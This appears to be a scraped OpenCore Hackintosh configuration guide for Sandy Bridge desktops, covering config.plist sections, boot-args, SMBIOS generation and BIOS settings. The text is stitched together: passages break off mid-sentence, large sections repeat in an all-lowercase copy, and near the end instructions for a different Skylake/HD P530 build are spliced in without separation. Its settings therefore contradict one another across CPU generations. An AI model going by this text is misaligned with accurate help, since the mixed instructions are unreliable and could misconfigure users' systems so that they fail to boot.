for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nInfo\n\nThis blocks certain ACPI tables from loading, for us we really care about this. Main reason is that Apple's XCPM does not support SandyBridge all too well and can cause AppleIntelCPUPowerManagement panics on boot. To avoid this we make our own PM SSDT in Post-Install and drop the old tables(Note that this is only temporary until we've made our SSDT-PM, we'll re-enable these tables later):\n\nRemoving CpuPm:\n\nKEY              TYPE      VALUE\nAll              Boolean   YES\nComment          String    Delete CpuPm\nEnabled          Boolean   YES\nOemTableId       Data      437075506d000000\nTableLength      Number    0\nTableSignature   Data      53534454\n\nRemoving Cpu0Ist:\n\nKEY              TYPE      VALUE\nAll              Boolean   YES\nComment          String    Delete Cpu0Ist\nEnabled          Boolean   YES\nOemTableId       Data      4370753049737400\nTableLength      Number    0\nTableSignature   Data      53534454\n\n\n# Patch\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, our patches are handled by our SSDTs. This is a much cleaner solution as this will allow us to boot Windows and other OSes with OpenCore\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing spaces to be passthrough to macOS that are generally ignored, useful when paired with DevirtualiseMmio\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, for us, we leave it as default\n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc.\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode, however this quirk is only applicable to UEFI platforms.\n * EnableWriteUnprotector: YES\n   * Needed to remove write protection from CR0 register.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * SetupVirtualMap: YES\n   * Fixes SetVirtualAddresses calls to virtual addresses, required for Gigabyte boards to resolve early kernel panics\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nPciRoot(0x0)/Pci(0x2,0x0)\n\nThis section is set up via WhateverGreen's Framebuffer Patching Guide and is used for setting important iGPU properties.\n\nThe config.plist doesn't already have a section for this so you will have to create it manually.\n\nThe AAPL,snb-platform-id is what macOS uses to determine how the iGPU drivers interact with our system, and the two values choose between are as follows:\n\nAAPL,SNB-PLATFORM-ID   COMMENT\n10000300               Used when the Desktop iGPU is used to drive a display\n00000500               Used when the Desktop iGPU is only used for computing tasks\n                       and doesn't drive a display\n\nWe also have the issue of requiring a supported device-id, just like with the above table you'll want to match up to your hardware configuration:\n\nDEVICE-ID   COMMENT\n26010000    Used when the Desktop iGPU is used to drive a display\n02010000    Used when the Desktop iGPU is only used for computing tasks\n            and doesn't drive a display\n\nAnd finally, you should have something like this:\n\nKEY                    TYPE   VALUE\nAAPL,snb-platform-id   Data   00000500\ndevice-id              Data   26010000\n\n(This is an example for a desktop HD 3000 with a dGPU used as the output)\n\nPciRoot(0x0)/Pci(0x16,0x0)\n\nThis is needed if you're pairing an Sandy Bridge CPU with a 7 series motherboard(ie. B75, Q75, Z75, H77, Q77, Z77), specifically needed to spoof your IMEI device into being supported. Note this property is still required with or without SSDT-IMEI.\n\nKEY         TYPE   VALUE\ndevice-id   Data   3A1C0000\n\nNote: This is not needed if you have a 6 series motherboard(ie. H61, B65, Q65, P67, H67, Q67, Z68)\n\nPciRoot(0x0)/Pci(0x1b,0x0)\n\nlayout-id\n\n * Applies AppleALC audio injection, you'll need to do your own research on which codec your motherboard has and match it with AppleALC's layout. AppleALC Supported Codecs.\n * You can delete this property outright as it's unused for us at this time\n\nFor us, we'll be using the boot-arg alcid=xxx instead to accomplish this. alcid will override all other layout-IDs present. More info on this is covered in the Post-Install Page\n\n\n# Delete\n\nRemoves device properties from the map, for us we can ignore this\n\n\n# Kernel\n\n\n\n\n# Add\n\nHere's where we specify which kexts to load, in what specific order to load, and what architectures each kext is meant for. By default we recommend leaving what ProperTree has done, however for 32-bit CPUs please see below:\n\nMore in-depth Info\n\nThe main thing you need to keep in mind is:\n\n * Load order\n   * Remember that any plugins should load after its dependencies\n   * This means kexts like Lilu must come before VirtualSMC, AppleALC, WhateverGreen, etc\n\nA reminder that ProperTree users can run Cmd/Ctrl + Shift + R to add all their kexts in the correct order without manually typing each kext out.\n\n * Arch\n   * Architectures supported by this kext\n   * Currently supported values are Any, i386 (32-bit), and x86_64 (64-bit)\n * BundlePath\n   * Name of the kext\n   * ex: Lilu.kext\n * Enabled\n   * Self-explanatory, either enables or disables the kext\n * ExecutablePath\n   * Path to the actual executable is hidden within the kext, you can see what path your kext has by right-clicking and selecting Show Package Contents. Generally, they'll be Contents/MacOS/Kext but some have kexts hidden within under Plugin folder. Do note that plist only kexts do not need this filled in.\n   * ex: Contents/MacOS/Lilu\n * MinKernel\n   * Lowest kernel version your kext will be injected into, see below table for possible values\n   * ex. 12.00.00 for OS X 10.8\n * MaxKernel\n   * Highest kernel version your kext will be injected into, see below table for possible values\n   * ex. 11.99.99 for OS X 10.7\n * PlistPath\n   * Path to the info.plist hidden within the kext\n   * ex: Contents/Info.plist\n\nKernel Support Table\n\nOS X VERSION   MINKERNEL   MAXKERNEL\n10.4           8.0.0       8.99.99\n10.5           9.0.0       9.99.99\n10.6           10.0.0      10.99.99\n10.7           11.0.0      11.99.99\n10.8           12.0.0      12.99.99\n10.9           13.0.0      13.99.99\n10.10          14.0.0      14.99.99\n10.11          15.0.0      15.99.99\n10.12          16.0.0      16.99.99\n10.13          17.0.0      17.99.99\n10.14          18.0.0      18.99.99\n10.15          19.0.0      19.99.99\n11             20.0.0      20.99.99\n12             21.0.0      21.99.99\n13             22.0.0      22.99.99\n\n\n# Emulate\n\nNeeded for spoofing unsupported CPUs like Pentiums and Celerons\n\n * Cpuid1Mask: Leave this blank\n * Cpuid1Data: Leave this blank\n\n\n# Force\n\nUsed for loading kexts off system volume, only relevant for older operating systems where certain kexts are not present in the cache(ie.

Usually relevant for Dell laptops\n   * Enabling this quirk with UpdateSMBIOSMode Custom mode can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n * DisableIoMapper: YES\n   * Needed to get around VT-D if either unable to disable in BIOS or needed for other operating systems, much better alternative to dart=0 as SIP can stay on in Catalina\n * DisableLinkeditJettison: YES\n   * Allows Lilu and others to have more reliable performance without keepsyms=1\n * DisableRtcChecksum: NO\n   * Prevents AppleRTC from writing to primary checksum (0x58-0x59), required for users who either receive BIOS reset or are sent into Safe mode after reboot/shutdown\n * ExtendBTFeatureFlags NO\n   * Helpful for those having continuity issues with non-Apple/non-Fenvi cards\n * LapicKernelPanic: NO\n   * Disables kernel panic on AP core lapic interrupt, generally needed for HP systems. Clover equivalent is Kernel LAPIC\n * LegacyCommpage: NO\n   * Resolves SSSE3 requirement for 64 Bit CPUs in macOS, mainly relevant for 64-Bit Pentium 4 CPUs(ie. Prescott)\n * PanicNoKextDump: YES\n   * Allows for reading kernel panics logs when kernel panics occur\n * PowerTimeoutKernelPanic: YES\n   * Helps fix kernel panics relating to power changes with Apple drivers in macOS Catalina, most notably with digital audio.\n * SetApfsTrimTimeout: -1\n   * Sets trim timeout in microseconds for APFS filesystems on SSDs, only applicable for macOS 10.14 and newer with problematic SSDs.\n * XhciPortLimit: YES\n   * This is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing USB. Please create a USB map when possible.\n   * With macOS 11.3+, XhciPortLimit may not function as intended. We recommend users either disable this quirk and map before upgrading or map from Windows. You may also install macOS 11.2.3 or older.\n\n\n# Scheme\n\nSettings related to legacy booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy OSes you can see below:\n\nMore in-depth Info\n\n * FuzzyMatch: True\n   \n   * Used for ignoring checksums with kernelcache, instead opting for the latest cache available. Can help improve boot performance on many machines in 10.6\n\n * KernelArch: x86_64\n   \n   * Set the kernel's arch type, you can choose between Auto, i386 (32-bit), and x86_64 (64-bit).\n   * If you're booting older OSes which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to Auto and let macOS decide based on your SMBIOS. See below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit CPUs must use this(or CPUs missing SSSE3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * KernelCache: Auto\n   \n   * Set kernel cache type, mainly useful for debugging and so we recommend Auto for best support\n\n\n# Misc\n\n\n\n\n# Boot\n\nInfo\n\nQUIRK           ENABLED   COMMENT\nHideAuxiliary   YES       Press space to show macOS recovery and other auxiliary\n                          entries\n\nMore in-depth Info\n * HideAuxiliary: YES\n   * This option will hide supplementary entries, such as macOS recovery and tools, in the picker.

Can be considered a security risk so optional\n\n * BlacklistAppleUpdate: YES\n   \n   * Used for blocking firmware updates, used as extra level of protection as macOS Big Sur no longer uses run-efi-updater variable\n\n * DmgLoading: Signed\n   \n   * Ensures only signed DMGs load\n\n * ExposeSensitiveData: 6\n   \n   * Shows more debug information, requires debug version of OpenCore\n\n * Vault: Optional\n   \n   * We won't be dealing vaulting so we can ignore, you won't boot with this set to Secure\n   * This is a word, it is not optional to omit this setting. You will regret it if you don't set it to Optional, note that it is case-sensitive\n\n * ScanPolicy: 0\n   \n   * 0 allows you to see all drives available, please refer to Security section for further details. Will not boot USB devices with this set to default\n\n * SecureBootModel: Default\n   \n   * Controls Apple's secure boot functionality in macOS, please refer to Security section for further details.\n   * Note: Users may find upgrading OpenCore on an already installed system can result in early boot failures. To resolve this, see here: Stuck on OCB: LoadImage failed - Security Violation\n\n\n# Serial\n\nUsed for serial debugging (Leave everything as default).\n\n\n# Tools\n\nUsed for running OC debugging tools like the shell, ProperTree's snapshot function will add these for you.\n\n\n# Entries\n\nUsed for specifying irregular boot paths that can't be found naturally with OpenCore.\n\nWon't be covered here, see 8.6 of Configuration.pdf for more info\n\n\n# NVRAM\n\n\n\n\n# Add\n\n4D1EDE05-38C7-4A6A-9CC6-4BCCA8B38C14\n\nUsed for OpenCore's UI scaling, default will work for us.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic. That can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       Used for setting layout-id for AppleALC, see supported\n              codecs to figure out which layout to use for your specific\n              system. More info on this is covered in the Post-Install\n              Page\n\n * GPU-Specific boot-args:\n\nBOOT-ARGS        DESCRIPTION\nagdpmod=pikera   Used for disabling board ID checks on some Navi GPUs (RX\n                 5000 & 6000 series), without this you'll get a black screen.\n                 Don't use if you don't have Navi (ie. Polaris and Vega cards\n                 shouldn't use this)\n-radcodec        Used for allowing officially unsupported AMD GPUs (spoofed)\n                 to use the Hardware Video Encoder\nradpg=15         Used for disabling some power-gating modes, helpful for\n                 properly initializing AMD Cape Verde based GPUs\nunfairgva=1      Used for fixing hardware DRM support on supported AMD GPUs\nnvda_drv_vrl=1   Used for enabling NVIDIA's Web Drivers on Maxwell and Pascal\n                 cards in macOS Sierra and High Sierra\n-wegnoegpu       Used for disabling all other GPUs than the integrated Intel\n                 iGPU, useful for those wanting to run newer versions of\n                 macOS where their dGPU isn't supported\n\n * csr-active-config: 00000000\n   \n   * Settings for 'System Integrity Protection' (SIP). It is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables System Integrity Protection. You can choose a number of different values but overall we recommend keeping this enabled for best security practices. More info can be found in our troubleshooting page: Disabling SIP\n\n * run-efi-updater: No\n   \n   * This is used to prevent Apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for Macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * Needed for non-latin keyboards in the format of lang-COUNTRY:keyboard, recommended to keep blank though you can specify it(Default in Sample config is Russian):\n   * American: en-US:0(656e2d55533a30 in HEX)\n   * Full list can be found in AppleKeyboardLayouts.txt\n   * Hint: prev-lang:kbd can be changed into a String so you can input en-US:0 directly instead of converting to HEX\n   * Hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the Language Picker to appear instead at first boot up.\n\nKEY             TYPE     VALUE\nprev-lang:kbd   String   en-US:0\n\n\n# Delete\n\nInfo\n\nForcibly rewrites NVRAM variables, do note that Add will not overwrite values already present in NVRAM so values like boot-args should be left alone. For us, we'll be changing the following:\n\nQUIRK        ENABLED\nWriteFlash   YES\n\nMore in-depth Info\n\n * LegacySchema\n   \n   * Used for assigning NVRAM variables, used with OpenVariableRuntimeDxe.efi. Only needed for systems without native NVRAM\n\n * WriteFlash: YES\n   \n   * Enables writing to flash memory for all added variables.\n\n\n# PlatformInfo\n\n\n\nInfo\n\nFor setting up the SMBIOS info, we'll use CorpNewt's GenSMBIOS application.\n\nFor this Sandy Bridge example, we'll chose the iMac12,2 SMBIOS - this is done intentionally for compatibility's sake. There are two main SMBIOS used for Sandy Bridge:\n\nSMBIOS      HARDWARE\niMac12,2    Default Sandy Bridge SMBIOS\nMacPro6,1   Mojave and newer SMBIOS\n\n * If you plan to later run macOS 10.14, Mojave or newer, MacPro6,1 will be the recommended SMBIOS and the iGPU must be disabled in the BIOS due to no longer being supported\n\nRun GenSMBIOS, pick option 1 for downloading MacSerial and Option 3 for selecting out SMBIOS. This will give us an output similar to the following:\n\n  #######################################################\n #               iMac12,2 SMBIOS Info                  #\n#######################################################\n\nType:         iMac12,2\nSerial:       C02KCYZLDNCW\nBoard Serial: C02309301QXF2FRJC\nSmUUID:       A154B586-874B-4E57-A1FF-9D6E503E4580\n\n\nThe Type part gets copied to Generic -> SystemProductName.\n\nThe Serial part gets copied to Generic -> SystemSerialNumber.\n\nThe Board Serial part gets copied to Generic -> MLB.\n\nThe SmUUID part gets copied to Generic -> SystemUUID.\n\nWe set Generic -> ROM to either an Apple ROM (dumped from a real Mac), your NIC MAC address, or any random MAC address (could be just 6 random bytes, for this guide we'll use 11223300 0000. After install follow the Fixing iServices page on how to find your real MAC Address)\n\nReminder that you need an invalid serial! When inputting your serial number in Apple's Check Coverage Page, you should get a message such as \"Unable to check coverage for this serial number.\"\n\nAutomatic: YES\n\n * Generates PlatformInfo based on Generic section instead of DataHub, NVRAM, and SMBIOS sections\n\n\n# Generic\n\nMore in-depth Info\n\n * AdviseFeatures: NO\n   \n   * Used for when the EFI partition isn't first on the Windows drive\n\n * MaxBIOSVersion: NO\n   \n   * Sets BIOS version to Max to avoid firmware updates in Big Sur+, mainly applicable for genuine Macs.\n\n * ProcessorType: 0\n   \n   * Set to 0 for automatic type detection, however this value can be overridden if desired. See AppleSmBios.h for possible values\n\n * SpoofVendor: YES\n   \n   * Swaps vendor field for Acidanthera, generally not safe to use Apple as a vendor in most case\n\n * SystemMemoryStatus: Auto\n   \n   * Sets whether memory is soldered or not in SMBIOS info, purely cosmetic and so we recommend Auto\n\n * UpdateDataHub: YES\n   \n   * Update Data Hub fields\n\n * UpdateNVRAM: YES\n   \n   * Update NVRAM fields\n\n * UpdateSMBIOS: YES\n   \n   * Updates SMBIOS fields\n\n * UpdateSMBIOSMode: Create\n   \n   * Replace the tables with newly allocated EfiReservedMemoryType, use Custom on Dell laptops requiring CustomSMBIOSGuid quirk\n   * Setting to Custom with CustomSMBIOSGuid quirk enabled can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n\n\n# UEFI\n\n\n\nConnectDrivers: YES\n\n * Forces .efi drivers, change to NO will automatically connect added UEFI drivers. This can make booting slightly faster, but not all drivers connect themselves. E.g. certain file system drivers may not load.\n\n\n# Drivers\n\nAdd your .efi drivers here.\n\nOnly drivers present here should be:\n\n * HfsPlusLegacy.efi\n * OpenRuntime.efi\n * OpenUsbKbDxe.efi(If your firmware does not support UEFI)\n\nMore in-depth Info\n\nKEY         TYPE      DESCRIPTION\nPath        String    Path of the file from OC/Drivers directory\nLoadEarly   Boolean   Load the driver early before NVRAM setup, should only be\n                      enabled for OpenRuntime.efi and OpenVariableRuntimeDxe.efi\n                      if using legacy NVRAM\nArguments   String    Some drivers accept additional arguments which are specified\n                      here.\n\n\n# APFS\n\nBy default, OpenCore only loads APFS drivers from macOS Big Sur and newer. If you are booting macOS Catalina or earlier, you may need to set a new minimum version/date. Not setting this can result in OpenCore not finding your macOS partition!\n\nmacOS Sierra and earlier use HFS instead of APFS. You can skip this section if booting older versions of macOS.\n\nAPFS Versions\n\nBoth MinVersion and MinDate need to be set if changing the minimum version.\n\nMACOS VERSION           MIN VERSION        MIN DATE\nHigh Sierra (10.13.6)   748077008000000    20180621\nMojave (10.14.6)        945275007000000    20190820\nCatalina (10.15.4)      1412101001000000   20200306\nNo restriction          -1                 -1\n\n\n# Audio\n\nRelated to AudioDxe settings, for us we'll be ignoring(leave as default). This is unrelated to audio support in macOS.\n\n * For further use of AudioDxe and the Audio section, please see the Post Install page: Add GUI and Boot-chime\n\n\n# Input\n\nInfo\n\nRelated to boot.efi keyboard passthrough used for FileVault and Hotkey support, leave everything here as default besides:\n\nQUIRK        VALUE   COMMENT\nKeySupport   NO      Enable if your BIOS supports UEFI\n\n\n# Output\n\nRelating to OpenCore's visual output, leave everything here as default as we have no use for these quirks.\n\nMore in-depth Info\n\nOUTPUT    VALUE   COMMENT\nUIScale   0       0 will automatically set based on resolution\n                  -1 will leave it unchanged\n                  1 for 1x scaling, for normal displays\n                  2 for 2x scaling, for HiDPI displays\n\n\n# ProtocolOverrides\n\nMainly relevant for Virtual machines, legacy macs and FileVault users. See here for more details: Security and FileVault\n\n\n# Quirks\n\nInfo\n\nRelating to quirks with the UEFI environment, for us we'll be changing the following:\n\nQUIRK                    ENABLED   COMMENT\nIgnoreInvalidFlexRatio   YES       \nUnblockFsConnect         NO        Needed mainly by HP motherboards\n\nMore in-depth Info\n\n * IgnoreInvalidFlexRatio: YES\n   \n   * Fix for when MSR_FLEX_RATIO (0x194) can't be disabled in the BIOS, required for all pre-Skylake based systems\n\n * DisableSecurityPolicy: NO\n   \n   * Disables platform security policy in firmware, recommended for buggy firmwares where disabling Secure Boot does not allow 3rd party firmware drivers to load.\n   * If running a Microsoft Surface device, recommended to enable this option\n\n * RequestBootVarRouting: YES\n   \n   * Redirects AptioMemoryFix from EFI_GLOBAL_VARIABLE_GUID to OC_VENDOR_VARIABLE_GUID. Needed for when firmware tries to delete boot entries and is recommended to be enabled on all systems for correct update installation, Startup Disk control panel functioning, etc.\n\n * UnblockFsConnect: NO\n   \n   * Some firmware block partition handles by opening them in By Driver mode, which results in File System protocols being unable to install. Mainly relevant for HP systems when no drives are listed\n\n\n# ReservedMemory\n\nUsed for exempting certain memory regions from OSes to use, mainly relevant for Sandy Bridge iGPUs or systems with faulty memory. Use of this quirk is not covered in this guide\n\n\n# Cleaning up\n\nAnd now you're ready to save and place it into your EFI under EFI/OC.\n\nFor those having booting issues, please make sure to read the Troubleshooting section first and if your questions are still unanswered we have plenty of resources at your disposal:\n\n * r/Hackintosh Subreddit\n * r/Hackintosh Discord\n\n\n# Intel BIOS settings\n\n * Note: Most of these options may not be present in your firmware, we recommend matching up as closely as possible but don't be too concerned if many of these options are not available in your BIOS\n\n\n# Disable\n\n * Fast Boot\n * Secure Boot\n * Serial/COM Port\n * Parallel Port\n * VT-d (can be enabled if you set DisableIoMapper to YES)\n * Compatibility Support Module (CSM) (Must be off in most cases, GPU errors/stalls like gIO are common when this option is enabled)\n * Thunderbolt (For initial install, as Thunderbolt can cause issues if not setup correctly)\n * Intel SGX\n * Intel Platform Trust\n * CFG Lock (MSR 0xE2 write protection)(This must be off, if you can't find the option then enable AppleCpuPmCfgLock under Kernel -> Quirks.

you how to configure everything, you won't be left in the cold. this also means if you have issues, review your config settings to make sure they're correct. main things to note with opencore:\n\n * all properties must be defined, there are no default opencore will fall back on so do not delete sections unless told explicitly so. if the guide doesn't mention the option, leave it at default.\n * the sample.plist cannot be used as-is, you must configure it to your system\n * do not use configurators, these rarely respect opencore's configuration and even some like mackie's will add clover properties and corrupt plists!\n\nnow with all that, a quick reminder of the tools we need\n\n * propertree\n   * universal plist editor\n * gensmbios\n   * for generating our smbios data\n * sample/config.plist\n   * see previous section on how to obtain: config.plist setup\n\nwarning\n\nread this guide more than once before setting up opencore and make sure you have it set up correctly.

add ssdts for your system, these are very important to booting macos and have many uses like usb maps, disabling unsupported gpus and such. and with our system, it's even required to boot. guide on making them found here: getting started with acpi\n\nfor us we'll need a couple of ssdts to bring back functionality that clover provided:\n\nrequired ssdts   description\nssdt-pm          needed for

those wanting a deeper dive into dumping your dsdt, how to make these ssdts, and compiling them, please see the getting started with acpi page. compiled ssdts have a .aml extension(assembled) and will go into the efi/oc/acpi folder and must be specified in your config under acpi -> add as well.\n\n\n# delete\n\ninfo\n\nthis blocks certain acpi tables from loading, for us we really care about this. main reason is that apple's xcpm does not support sandybridge all too well and can cause appleintelcpupowermanagement panics on boot. to avoid this we make our own pm ssdt in post-install and drop the old tables(note that this is only temporary until we've made our ssdt-pm, we'll re-enable these tables later):\n\nremoving cpupm:\n\nkey              type      value\nall              boolean

can see below:\n\nmore in-depth info\n\n * fuzzymatch: true\n   \n   * used for ignoring checksums with kernelcache, instead opting for the latest cache available. can help improve boot performance on many machines in 10.6\n\n * kernelarch: x86_64\n   \n   * set the kernel's arch type, you can choose between auto, i386 (32-bit), and x86_64 (64-bit).\n   * if you're booting older oses which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * kernelcache: auto\n   \n   * set kernel cache type, mainly useful for debugging and so we

booting\n              instead of the apple logo and progress bar. it's invaluable\n              to any hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   this disables macos's watchdog which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also print the symbols on a kernel panic. that can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       used for setting layout-id for

and high sierra\n-wegnoegpu       used for disabling all other gpus than the integrated intel\n                 igpu, useful for those wanting to run newer versions of\n                 macos where their dgpu isn't supported\n\n * csr-active-config: 00000000\n   \n   * settings for 'system integrity protection' (sip). it is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables system integrity protection. you can choose a number of different values but overall we recommend keeping this enabled for best security practices. more info can be found in our troubleshooting page: disabling sip\n\n * run-efi-updater: no\n   \n   * this is used to prevent apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * needed for non-latin keyboards in the format of lang-country:keyboard, recommended to keep blank though you can specify it(default in sample config is russian):\n   * american: en-us:0(656e2d55533a30 in hex)\n   * full list can be found in applekeyboardlayouts.txt\n   * hint: prev-lang:kbd can be changed into a string so you can input en-us:0 directly instead of converting to hex\n   * hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the language picker to appear instead at first boot up.\n\nkey             type     value\nprev-lang:kbd   string   en-us:0\n\n\n# delete\n\ninfo\n\nforcibly

* writeflash: yes\n   \n   * enables writing to flash memory for all added variables.\n\n\n# platforminfo\n\n\n\ninfo\n\nfor setting up the smbios info, we'll use corpnewt's gensmbios application.\n\nfor this sandy bridge example, we'll chose the imac12,2 smbios - this is done intentionally for compatibility's sake. there are two main smbios used for sandy bridge:\n\nsmbios      hardware\nimac12,2    default sandy bridge smbios\nmacpro6,1   mojave and newer smbios\n\n * if you plan to later run macos 10.14, mojave or newer, macpro6,1 will be the recommended smbios and the igpu must be disabled in the bios due to no longer being supported\n\nrun gensmbios, pick option 1 for downloading macserial and option 3 for selecting out smbios. this will give us an output similar to the following:\n\n  #######################################################\n #               imac12,2 smbios info

it's not. It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-PLUG        Allows for native CPU power management on Haswell and newer,\n                 see Getting Started With ACPI Guide for more details.\nSSDT-EC-USBX     Fixes both the embedded controller and USB power, see\n                 Getting Started With ACPI Guide for more details.\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, our patches are handled by our SSDTs. This is a much cleaner solution as this will allow us to boot Windows and other OSes with OpenCore\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing spaces to be passthrough to macOS that are generally ignored, useful when paired with DevirtualiseMmio\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, for us, we leave it as default\n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc.\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: YES\n   * Needed to remove write protection from CR0 register.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * SetupVirtualMap: YES\n   * Fixes SetVirtualAddresses calls to virtual addresses, required for Gigabyte boards to resolve early kernel panics.\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nPciRoot(0x0)/Pci(0x2,0x0)\n\nThis section is set up via WhateverGreen's Framebuffer Patching Guide and is used for setting important iGPU properties.\n\nThe config.plist doesn't already have a section for this so you will have to create it manually.\n\nAAPL,ig-platform-id is what macOS uses to determine how the iGPU drivers interact with our system, and the two values choose between are as follows:\n\nAAPL,IG-PLATFORM-ID   COMMENT\n00001219              Used when the Desktop iGPU is used to drive a display\n01001219              Used when the Desktop iGPU is only used for computing tasks\n                      and doesn't drive a display\n\nNote: If booting macOS Ventura, you need to spoof your iGPU as the closest Kaby Lake model.\n\nWe also add 3 more properties, framebuffer-patch-enable, framebuffer-stolenmem and framebuffer-fbmem. The first enables patching via WhateverGreen.kext, the second sets the min stolen memory to 19MB and third sets the framebuffer memory to 9MB. This is usually unnecessary, as this can be configured in BIOS(64MB recommended) but required when not available.\n\n * Note: Headless framebuffers(where the dGPU is the display out) do not need framebuffer-patch-enable, framebuffer-stolenmem and framebuffer-fbmem\n\nAnd extra note for P530 users, your iGPU is not natively supported so you will need to add the following property:\n\nKEY         TYPE   VALUE\ndevice-id   Data   1B190000\n\nOnce you're done, you should have something similar:\n\nKEY                        TYPE   VALUE\nAAPL,ig-platform-id        Data   00001219\nframebuffer-patch-enable   Data   01000000\nframebuffer-stolenmem      Data   00003001\nframebuffer-fbmem          Data   00009000\ndevice-id                  Data   1B190000\n\n(This is an example for a desktop HD P530 without a dGPU and no BIOS options for iGPU memory)\n\nPciRoot(0x0)/Pci(0x1b,0x0)\n\nlayout-id\n\n * Applies 